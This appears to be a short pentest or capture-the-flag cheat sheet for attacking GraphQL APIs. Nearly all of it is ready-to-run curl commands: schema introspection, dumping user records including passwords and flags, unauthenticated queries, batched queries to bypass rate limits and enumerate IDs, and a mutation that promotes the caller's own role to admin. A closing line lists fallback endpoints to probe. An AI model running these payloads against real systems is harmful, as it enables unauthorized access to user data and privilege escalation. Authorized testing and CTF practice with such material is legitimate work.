# GraphQL

```bash
# introspection
curl -si -X POST <target>/graphql $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name args { name } } } } }"}'

# all users incl. sensitive fields
curl -si -X POST <target>/graphql $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"query":"{ users { id username role email password flag } }"}'

# unauthenticated
curl -si -X POST <target>/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ users { id username role flag } }"}'

# batching — rate-limit bypass / bulk IDOR
curl -si -X POST <target>/graphql $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '[{"query":"{ user(id: 1) { flag } }"},{"query":"{ user(id: 2) { flag } }"},{"query":"{ user(id: 3) { flag } }"}]'

# privilege escalation mutation
curl -si -X POST <target>/graphql $AUTH_HEADER -H 'Content-Type: application/json' \
  -d '{"query":"mutation { updateUser(id: \"<your-id>\", role: \"admin\") { id role } }"}'
```

If introspection is disabled, mine field names from the JS bundle (`web-recon.md` already greps for `query`/`mutation` blocks) and probe them directly. Also try `/api/graphql`, `/v1/graphql`, `/query`, and a `GET` with `?query=`.
